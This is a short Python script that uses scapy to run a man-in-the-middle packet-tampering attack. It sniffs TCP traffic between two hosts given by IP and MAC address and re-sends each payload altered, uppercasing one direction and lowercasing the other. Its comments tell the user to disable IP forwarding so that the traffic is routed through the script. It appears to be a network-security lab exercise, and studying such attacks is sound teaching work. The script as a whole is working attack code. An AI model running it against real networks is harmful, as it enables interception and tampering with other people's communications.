#!/usr/bin/python3
# ensure that output of 'sysctl net.ipv4.ip_forward'  should be zero.
# set this value to zero by following command. NO SPACE before and after '=' sign.
# sysctl -w net.ipv4.ip_forward=0
# --------------------------------
# the program converts all lowercase to uppercase from A to B
# the program converts all uppercase to lowercase from B to A
# -------------------------------
import sys
import re
from scapy.all import *

if len(sys.argv) != 5:
  print("Usage: sys.argv[0] <IP of A> <MAC of A> <IP of B> <MAC of B>")
  exit();

def spoof_pkt(pkt):
  newpkt = IP(bytes(pkt[IP]))
  del(newpkt.chksum)
  del(newpkt.len)
  del(newpkt[TCP].payload)
  del(newpkt[TCP].chksum)
  if not pkt[TCP].payload:
    send(newpkt)
  elif pkt[IP].src == ip_A and pkt[IP].dst == ip_B:
      data = pkt[TCP].payload.load
      newdata = data.decode().upper() + "H1: "
      send(newpkt/newdata)
  elif pkt[IP].src == ip_B and pkt[IP].dst == ip_A:
      data = pkt[TCP].payload.load
      newdata = data.decode().lower() + "H2: "
      send(newpkt/newdata)
  else:
      send(newpkt)

# program has all the 4 params
ip_A = sys.argv[1]
mac_A = sys.argv[2]
ip_B = sys.argv[3]
mac_B = sys.argv[4]

template = 'tcp and (ether src {A} or ether src {B})' 
cap_filter = template.format(A=mac_A, B=mac_B)
print(cap_filter)
pkt = sniff(iface='eth0', filter=cap_filter, prn=spoof_pkt)

  
